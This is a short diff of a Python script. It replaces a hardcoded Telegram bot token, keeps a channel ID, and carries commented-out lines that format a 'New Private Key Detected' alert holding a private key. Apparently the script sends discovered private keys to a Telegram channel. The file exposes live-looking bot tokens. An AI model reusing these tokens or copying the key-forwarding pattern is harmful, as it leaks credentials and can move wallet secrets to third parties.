@@ -64,7 +64,7 @@ def send_telegram_message(token, chat_id, message):
         print(f"An error occurred: {e}")
 
 # --- Configuration ---
-BOT_TOKEN = "8746690272:AAHJJTT9apdfqLlNxG9qYNCm-ipm-e-xg24"
+BOT_TOKEN = "8746690272:AAEr-xNwkZSBZOvq8TYf_OLnZ2S0rJxSkYg"
 CHANNEL_ID = -1003719196426
 #PRIVATE_KEY = ""
 #TEXT_MESSAGE = f"<b>New Private Key Detected</b>\n<code>{PRIVATE_KEY}</code>"
